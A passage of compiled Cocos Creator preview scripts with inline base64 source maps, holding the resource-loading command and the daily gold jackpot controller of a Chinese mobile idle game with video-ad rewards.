Qcm94eS5nb2xkQ291bnQgKz0gc2lnbGVHb2xkO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUdvbGQoKTtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLmNoZWNrV2luKCk7XHJcbiAgICAgICAgICAgICAgICB9KSksIDEpKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCJBY3Rpb25zLmJvb209PT0+XCIpO1xyXG4gICAgICAgICAgICAvKiog5YOP6L2s55uY5LiA5qC354K45byAICovXHJcbiAgICAgICAgICAgIGxldCByYWRpdXMgPSA4MDtcclxuICAgICAgICAgICAgbGV0IG51bSA9IGVuZW15LmdvbGRJY29uRmVsbDtcclxuICAgICAgICAgICAgQWN0aW9ucy5ib29tKCgpPT57XHJcbiAgICAgICAgICAgICAgICBsZXQgbm9kZSA9IHRoaXMuZ2V0SW5hY3RpdmVHb2xkSWNvbk5vZGUoKTtcclxuICAgICAgICAgICAgICAgIG5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIHJldHVybiBub2RlO1xyXG4gICAgICAgICAgICB9LCBwb3NpdGlvbiwgR29sZEljb25Ob2RlUG9zLCByYWRpdXMsIG51bSxtb3ZlU3BlZWQsICgpPT57XHJcbiAgICAgICAgICAgICAgICBpZiAoIWFkZEZsYWcpe1xyXG4gICAgICAgICAgICAgICAgICAgIGFkZEZsYWcgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgIEdhbWVQcm94eS5nb2xkQ291bnQgKz0gc2lnbGVHb2xkICsgcmVzdEdvbGQ7XHJcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIEdhbWVQcm94eS5nb2xkQ291bnQgKz0gc2lnbGVHb2xkO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVHb2xkKCk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmNoZWNrV2luKCk7XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnVwZGF0ZUdhbWVQcm9ncmVzcygpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uSW5pdEdhbWUoKXtcclxuICAgICAgICB0aGlzLmx2TGFiZWxzLmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4gdmFsdWUuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz4ke0dhbWVQcm94eS5sZXZlbC0xK2luZGV4fTwvb3V0bGluZT48L2I+YCk7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5sZXZlbCA8IDIpe1xyXG4gICAgICAgICAgICB0aGlzLmx2TGFiZWxzWzBdLm5vZGUuZ2V0UGFyZW50KCkuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMudXBkYXRlR2FtZVByb2dyZXNzKCk7XHJcbiAgICAgICAgdGhpcy51cGRhdGVHb2xkKCk7XHJcbiAgICB9XHJcblxyXG4gICAgb25TdGFydEdhbWUoKXtcclxuICAgICAgICBHb2xkSWNvbk5vZGVQb3MgPSB0aGlzLmdvbGRMYXllci5jb252ZXJ0VG9Ob2RlU3BhY2VBUih0aGlzLmdvbGRJY29uTm9kZS5jb252ZXJ0VG9Xb3JsZFNwYWNlQVIoY2MudjIoKSkpO1xyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZUdhbWVQcm9ncmVzcygpe1xyXG4gICAgICAgIHRoaXMuZ2FtZVByb2dyZXNzQmFyLnByb2dyZXNzID0gR2FtZVByb3h5LmtpbGxDb3VudCAvIEdhbWVQcm94eS5tYXhFbmVteU51bTtcclxuICAgICAgICB0aGlzLmdhbWVQcm9ncmVzc0xhYmVsLnN0cmluZyA9IGDliankvZnmlYzkurrvvJoke01hdGguY2VpbCgxMDAgKiAoR2FtZVByb3h5Lm1heEVuZW15TnVtIC0gR2FtZVByb3h5LmtpbGxDb3VudCkvR2FtZVByb3h5Lm1heEVuZW15TnVtKX0lYFxyXG4gICAgfVxyXG5cclxuICAgIC8vIHVwZGF0ZSAoZHQpIHt9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/LoadingCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ec9e9EHzntFyYuA7kcVJd7f', 'LoadingCommand');
// script/app/home/LoadingCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var LoadingCommand = /** @class */ (function () {
    function LoadingCommand() {
    }
    LoadingCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) {
                        console.log("LoadingCommand");
                        var list = [];
                        /** 初始化隔离层prefab */
                        list.push(ExcelConfig_1.ExcelConfig.loadAllExcel("data/"));
                        for (var i = 0; i < 8; i++) {
                            list.push(cc.loader.loadResAwait("prefab/entities/enemy/enemy" + (i + 1), cc.Prefab));
                        }
                        list.push(cc.loader.loadResAwait("prefab/guideCircle"));
                        list.push(cc.loader.loadResAwait("prefab/guideSke"));
                        list.push(Facade_1.default.initSeparationLayer("prefab/separationLayer"));
                        list.push(Facade_1.default.initTextTips("prefab/textTips"));
                        list.push(Facade_1.default.initTextTips("prefab/color"));
                        list.push(cc.loader.loadResAwait("frame_fy005", cc.SpriteFrame));
                        list.push(cc.loader.loadResDirAwait("sound/"));
                        /** 加载一些不是很紧急的资源 */
                        cc.loader.loadRes("prefab/exchange");
                        cc.loader.loadRes("prefab/friendRank");
                        cc.loader.loadRes("prefab/invites");
                        cc.loader.loadRes("prefab/props");
                        cc.loader.loadRes("prefab/roleSupply");
                        cc.loader.loadRes("prefab/settings");
                        cc.loader.loadRes("prefab/takeJackpot");
                        cc.loader.loadRes("prefab/tips");
                        cc.loader.loadRes("prefab/recommend");
                        Promise.all(list).then(function () {
                            console.log('加载完成...');
                            cc.sys.garbageCollect();
                            resolve();
                        }).catch(function (err) {
                            console.error(err);
                        });
                    })];
            });
        });
    };
    LoadingCommand = __decorate([
        ccclass("LoadingCommand")
    ], LoadingCommand);
    return LoadingCommand;
}());
exports.default = LoadingCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvTG9hZGluZ0NvbW1hbmQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBSW5HLDJEQUFzRDtBQUN0RCxxRUFBa0U7QUFJNUQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFLMUM7SUFBQTtJQXVDQSxDQUFDO0lBdENTLGdDQUFPLEdBQWI7UUFBZSxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOztnQkFDM0Isc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBQSxPQUFPO3dCQUN0QixPQUFPLENBQUMsR0FBRyxDQUFDLGdCQUFnQixDQUFDLENBQUM7d0JBRTlCLElBQUksSUFBSSxHQUFrQixFQUFFLENBQUM7d0JBRTdCLG1CQUFtQjt3QkFDbkIsSUFBSSxDQUFDLElBQUksQ0FBQyx5QkFBVyxDQUFDLFlBQVksQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDO3dCQUM3QyxLQUFLLElBQUksQ0FBQyxHQUFDLENBQUMsRUFBRSxDQUFDLEdBQUMsQ0FBQyxFQUFFLENBQUMsRUFBRSxFQUFDOzRCQUNuQixJQUFJLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLDZCQUE2QixHQUFDLENBQUMsQ0FBQyxHQUFDLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDO3lCQUNyRjt3QkFDRCxJQUFJLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLG9CQUFvQixDQUFDLENBQUMsQ0FBQzt3QkFDeEQsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxpQkFBaUIsQ0FBQyxDQUFDLENBQUM7d0JBQ3JELElBQUksQ0FBQyxJQUFJLENBQUMsZ0JBQU0sQ0FBQyxtQkFBbUIsQ0FBQyx3QkFBd0IsQ0FBQyxDQUFDLENBQUM7d0JBQ2hFLElBQUksQ0FBQyxJQUFJLENBQUMsZ0JBQU0sQ0FBQyxZQUFZLENBQUMsaUJBQWlCLENBQUMsQ0FBQyxDQUFDO3dCQUNsRCxJQUFJLENBQUMsSUFBSSxDQUFDLGdCQUFNLENBQUMsWUFBWSxDQUFDLGNBQWMsQ0FBQyxDQUFDLENBQUM7d0JBQy9DLElBQUksQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsYUFBYSxFQUFFLEVBQUUsQ0FBQyxXQUFXLENBQUMsQ0FBQyxDQUFDO3dCQUNqRSxJQUFJLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsZUFBZSxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUM7d0JBQy9DLG1CQUFtQjt3QkFDbkIsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsaUJBQWlCLENBQUMsQ0FBQzt3QkFDckMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsbUJBQW1CLENBQUMsQ0FBQzt3QkFDdkMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsZ0JBQWdCLENBQUMsQ0FBQzt3QkFDcEMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsY0FBYyxDQUFDLENBQUM7d0JBQ2xDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLG1CQUFtQixDQUFDLENBQUM7d0JBQ3ZDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLGlCQUFpQixDQUFDLENBQUM7d0JBQ3JDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLG9CQUFvQixDQUFDLENBQUM7d0JBQ3hDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLGFBQWEsQ0FBQyxDQUFDO3dCQUNqQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxrQkFBa0IsQ0FBQyxDQUFDO3dCQUV0QyxPQUFPLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQzs0QkFDbkIsT0FBTyxDQUFDLEdBQUcsQ0FBQyxTQUFTLENBQUMsQ0FBQzs0QkFDdkIsRUFBRSxDQUFDLEdBQUcsQ0FBQyxjQUFjLEVBQUUsQ0FBQzs0QkFDeEIsT0FBTyxFQUFFLENBQUM7d0JBQ2QsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLFVBQUEsR0FBRzs0QkFDUixPQUFPLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDO3dCQUN2QixDQUFDLENBQUMsQ0FBQztvQkFDUCxDQUFDLENBQUMsRUFBQzs7O0tBQ047SUF0Q2dCLGNBQWM7UUFEbEMsT0FBTyxDQUFDLGdCQUFnQixDQUFDO09BQ0wsY0FBYyxDQXVDbEM7SUFBRCxxQkFBQztDQXZDRCxBQXVDQyxJQUFBO2tCQXZDb0IsY0FBYyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmltcG9ydCB7SUNvbW1hbmR9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0lDb21tYW5kXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7d3hBcGl9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvd3hBcGkvd3hBcGlcIjtcclxuaW1wb3J0IE5ldHdvcmsgZnJvbSBcIi4uL25ldHdvcmsvTmV0d29ya1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5cclxuXHJcbkBjY2NsYXNzKFwiTG9hZGluZ0NvbW1hbmRcIilcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgTG9hZGluZ0NvbW1hbmQgaW1wbGVtZW50cyBJQ29tbWFuZCB7XHJcbiAgICBhc3luYyBleGVjdXRlICguLi5hcmdzKTpQcm9taXNlPGFueT57XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4ge1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcIkxvYWRpbmdDb21tYW5kXCIpO1xyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgbGV0IGxpc3Q6QXJyYXk8UHJvbWlzZT4gPSBbXTtcclxuXHJcbiAgICAgICAgICAgIC8qKiDliJ3lp4vljJbpmpTnprvlsYJwcmVmYWIgKi9cclxuICAgICAgICAgICAgbGlzdC5wdXNoKEV4Y2VsQ29uZmlnLmxvYWRBbGxFeGNlbChcImRhdGEvXCIpKTtcclxuICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPDg7IGkrKyl7XHJcbiAgICAgICAgICAgICAgICBsaXN0LnB1c2goY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9lbmVteS9lbmVteVwiKyhpKzEpLCBjYy5QcmVmYWIpKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBsaXN0LnB1c2goY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9ndWlkZUNpcmNsZVwiKSk7XHJcbiAgICAgICAgICAgIGxpc3QucHVzaChjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2d1aWRlU2tlXCIpKTtcclxuICAgICAgICAgICAgbGlzdC5wdXNoKEZhY2FkZS5pbml0U2VwYXJhdGlvbkxheWVyKFwicHJlZmFiL3NlcGFyYXRpb25MYXllclwiKSk7XHJcbiAgICAgICAgICAgIGxpc3QucHVzaChGYWNhZGUuaW5pdFRleHRUaXBzKFwicHJlZmFiL3RleHRUaXBzXCIpKTtcclxuICAgICAgICAgICAgbGlzdC5wdXNoKEZhY2FkZS5pbml0VGV4dFRpcHMoXCJwcmVmYWIvY29sb3JcIikpO1xyXG4gICAgICAgICAgICBsaXN0LnB1c2goY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcImZyYW1lX2Z5MDA1XCIsIGNjLlNwcml0ZUZyYW1lKSk7XHJcbiAgICAgICAgICAgIGxpc3QucHVzaChjYy5sb2FkZXIubG9hZFJlc0RpckF3YWl0KFwic291bmQvXCIpKTtcclxuICAgICAgICAgICAgLyoqIOWKoOi9veS4gOS6m+S4jeaYr+W+iOe0p+aApeeahOi1hOa6kCAqL1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlcyhcInByZWZhYi9leGNoYW5nZVwiKTtcclxuICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXMoXCJwcmVmYWIvZnJpZW5kUmFua1wiKTtcclxuICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXMoXCJwcmVmYWIvaW52aXRlc1wiKTtcclxuICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXMoXCJwcmVmYWIvcHJvcHNcIik7XHJcbiAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKFwicHJlZmFiL3JvbGVTdXBwbHlcIik7XHJcbiAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKFwicHJlZmFiL3NldHRpbmdzXCIpO1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlcyhcInByZWZhYi90YWtlSmFja3BvdFwiKTtcclxuICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXMoXCJwcmVmYWIvdGlwc1wiKTtcclxuICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXMoXCJwcmVmYWIvcmVjb21tZW5kXCIpO1xyXG5cclxuICAgICAgICAgICAgUHJvbWlzZS5hbGwobGlzdCkudGhlbigoKT0+e1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ+WKoOi9veWujOaIkC4uLicpO1xyXG4gICAgICAgICAgICAgICAgY2Muc3lzLmdhcmJhZ2VDb2xsZWN0KCk7XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgICAgIH0pLmNhdGNoKGVycj0+e1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihlcnIpO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/JackpotController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '4df4e9sTVZId7fiAYzaOydn', 'JackpotController');
// script/app/home/JackpotController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Extend_1 = require("../../../framework/extend/Extend");
var NetworkConfig_1 = require("../config/NetworkConfig");
var Network_1 = require("../network/Network");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var JackpotController = /** @class */ (function (_super) {
    __extends(JackpotController, _super);
    function JackpotController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.progressBar = null;
        _this.goldLabel = null;
        _this.takeLabel = null;
        _this.button = null;
        return _this;
    }
    // LIFE-CYCLE CALLBACKS:
    JackpotController.prototype.onLoad = function () {
        var _this = this;
        this.progressBar.node.active = false;
        this.goldLabel.node.active = false;
        this.takeLabel.node.active = false;
        Facade_1.default.canvasNode.on('TakeJackpot', this._takeIt, this);
        this.init();
        cc.game.on("video_6", function () {
            _this.takeIt3Do();
        }, this);
    };
    JackpotController.prototype.onDestroy = function () {
        Facade_1.default.canvasNode.off('TakeJackpot', this._takeIt, this);
    };
    JackpotController.prototype.init = function () {
        var _this = this;
        this.scheduleOnce(function () {
            _this.goldLabel.node.active = true;
            if (World_1.World.Storage.dayEarnTotalModifyTime == 0) {
                World_1.World.Storage.dayEarnTotalModifyTime = World_1.World.My.serverTime;
            }
            if (World_1.World.Storage.dayEarnExpireTime == 0) {
                World_1.World.Storage.dayEarnExpireTime = World_1.World.My.serverTime + 24 * 60 * 60 * 1000;
            }
            _this.schedule(function () {
                _this.updateDayEarnCD();
            }, 0);
            _this.updateDayEarnCD();
        }, 0.1);
    };
    JackpotController.prototype.updateDayEarnCD = function () {
        var currentTime = World_1.World.My.serverTime;
        var cdTime = (World_1.World.Storage.dayEarnExpireTime - currentTime) / 1000;
        var progress = 0;
        if (cdTime > 0) {
            progress = (24 * 60 * 60 * 1000 - cdTime * 1000) / (24 * 60 * 60 * 1000);
            if (progress > 1) {
                progress = 1;
            }
        }
        else {
            progress = 1;
        }
        this.progressBar.node.active = progress < 1;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        var dayGet = cfg[World_1.World.Storage.dayEarnLv - 1]['on_hook'];
        var diffTime = (World_1.World.My.serverTime - World_1.World.Storage.dayEarnTotalModifyTime) / 1000;
        var addTotal = Math.floor(diffTime / 3) * dayGet;
        if (addTotal > 0) {
            World_1.World.Storage.dayEarnTotal += addTotal;
        }
        this.goldLabel.string = Extend_1.ext.shortFormat(World_1.World.Storage.dayEarnTotal);
        this.button.interactable = World_1.World.Storage.dayEarnTotal > 0;
        this.takeLabel.node.active = World_1.World.Storage.dayEarnTotal > 0;
        this.progressBar.progress = (diffTime % 3) / 3;
    };
    JackpotController.prototype._takeIt = function (num) {
        console.log("【video】6 多倍金币【click】JackpotController _takeIt", num);
        if (num == 1) {
            this.takeId1();
        }
        else {
            this.takeIt3();
        }
    };
    JackpotController.prototype.takeId1 = function () {
        World_1.World.Storage.goldCount += World_1.World.Storage.dayEarnTotal * 1;
        Facade_1.default.executeCommand('ShowTipsCommand', "\u91D1\u5E01 +" + Extend_1.ext.shortFormat(World_1.World.Storage.dayEarnTotal * 1));
        World_1.World.Storage.dayEarnTotal = 0;
        World_1.World.Storage.dayEarnExpireTime = World_1.World.My.serverTime + 24 * 60 * 60 * 1000;
        this.updateDayEarnCD();
        if (NetworkConfig_1.NetworkConfig.connectServer) {
            Network_1.default.pushStorage();
        }
    };
    JackpotController.prototype.takeIt3 = function () {
        World_1.World.Storage._videoSign = 6;
        World_1.World.Storage.videoAd_show();
    };
    JackpotController.prototype.takeIt3Do = function () {
        World_1.World.Storage.goldCount += World_1.World.Storage.dayEarnTotal * 3;
        Facade_1.default.executeCommand('ShowTipsCommand', "\u91D1\u5E01 +" + Extend_1.ext.shortFormat(World_1.World.Storage.dayEarnTotal * 3));
        World_1.World.Storage.dayEarnTotal = 0;
        World_1.World.Storage.dayEarnExpireTime = World_1.World.My.serverTime + 24 * 60 * 60 * 1000;
        this.updateDayEarnCD();
        if (NetworkConfig_1.NetworkConfig.connectServer) {
            Network_1.default.pushStorage();
        }
    };
    __decorate([
        property(cc.ProgressBar)
    ], JackpotController.prototype, "progressBar", void 0);
    __decorate([
        property(cc.Label)
    ], JackpotController.prototype, "goldLabel", void 0);
    __decorate([
        property(cc.Label)
    ], JackpotController.prototype, "takeLabel", void 0);
    __decorate([
        property(cc.Button)
    ], JackpotController.prototype, "button", void 0);
    JackpotController = __decorate([
        ccclass
    ], JackpotController);
    return JackpotController;
}(cc.Component));
exports.default = JackpotController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvSmFja3BvdENvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLHVDQUFvQztBQUNwQyxxRUFBa0U7QUFDbEUsNkRBQTBEO0FBQzFELDJEQUFxRDtBQUNyRCx5REFBc0Q7QUFDdEQsOENBQXlDO0FBQ3pDLDJEQUFzRDtBQUVoRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUErQyxxQ0FBWTtJQUEzRDtRQUFBLHFFQStHQztRQTVHRyxpQkFBVyxHQUFtQixJQUFJLENBQUM7UUFHbkMsZUFBUyxHQUFhLElBQUksQ0FBQztRQUczQixlQUFTLEdBQVksSUFBSSxDQUFDO1FBRzFCLFlBQU0sR0FBYSxJQUFJLENBQUM7O0lBbUc1QixDQUFDO0lBakdHLHdCQUF3QjtJQUV4QixrQ0FBTSxHQUFOO1FBQUEsaUJBVUM7UUFURyxJQUFJLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ3JDLElBQUksQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDbkMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNuQyxnQkFBTSxDQUFDLFVBQVUsQ0FBQyxFQUFFLENBQUMsYUFBYSxFQUFFLElBQUksQ0FBQyxPQUFPLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDeEQsSUFBSSxDQUFDLElBQUksRUFBRSxDQUFDO1FBRVosRUFBRSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsU0FBUyxFQUFDO1lBQ2pCLEtBQUksQ0FBQyxTQUFTLEVBQUUsQ0FBQTtRQUNwQixDQUFDLEVBQUMsSUFBSSxDQUFDLENBQUM7SUFDWixDQUFDO0lBRUQscUNBQVMsR0FBVDtRQUNJLGdCQUFNLENBQUMsVUFBVSxDQUFDLEdBQUcsQ0FBQyxhQUFhLEVBQUUsSUFBSSxDQUFDLE9BQU8sRUFBRSxJQUFJLENBQUMsQ0FBQztJQUM3RCxDQUFDO0lBR0QsZ0NBQUksR0FBSjtRQUFBLGlCQWNDO1FBYkcsSUFBSSxDQUFDLFlBQVksQ0FBQztZQUNkLEtBQUksQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7WUFDbEMsSUFBSSxhQUFLLENBQUMsT0FBTyxDQUFDLHNCQUFzQixJQUFJLENBQUMsRUFBQztnQkFDMUMsYUFBSyxDQUFDLE9BQU8sQ0FBQyxzQkFBc0IsR0FBRyxhQUFL